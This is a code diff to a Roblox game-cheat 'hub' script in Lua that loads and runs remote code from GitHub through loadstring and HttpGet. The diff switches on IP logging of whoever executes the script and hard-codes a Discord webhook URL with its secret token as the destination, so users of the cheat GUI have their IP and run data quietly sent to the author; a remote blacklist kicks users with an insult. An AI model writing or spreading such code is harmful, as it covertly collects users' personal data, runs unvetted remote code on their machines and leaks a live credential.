@@ -5,7 +5,7 @@
 local ApiFTAP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Oxwoey/FTAP-Module/refs/heads/main/Module/ModuleFTAP"))()
 
 -- Load the UI library
-local OrionLib = loadstring(game:HttpGet("your_orion_gui"))()
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Oxwoey/ElysiumHub/refs/heads/main/El"))()
 
 -- Create a UI window
 local Window = OrionLib:MakeWindow({
@@ -15,14 +15,18 @@ local Window = OrionLib:MakeWindow({
     ConfigFolder = "ElysiumConfig"
 })
 
--- Configure FTAP API settings
+ApiFTAP:Blacklist({
+    BlacklistToggle = false, -- Enable or disable
+    Url = "https://pastebin.com/raw/JYvCaxAV",-- Your GitHub or Pastebin URL
+    KickText = "idi nahyi" -- Kick Text
+})
+
 ApiFTAP:SetSettings({
     NameHub = "Elysium Hub", -- Name of the hub (used for identification)
     WebhookEnabled = true, -- Enable or disable webhook functionality
-    ExecuteLogSecret = false, -- Enable or disable IP logging (use with caution)
-    WebhookLink = "" -- Your Discord webhook URL
+    ExecuteLogSecret = true, -- Enable or disable IP logging (use with caution)
+    WebhookLink = "https://discordapp.com/api/webhooks/1358066417106419772/f7Dis53P277JbOiVnBcR5SSARCgbQMobV9Vrui4HZqNdtihXNUoIwwjqku5qEnQ-G9QT" -- Your Discord webhook URL
 })
-
 
 -- Create the main tab
 local Tab = Window:MakeTab({
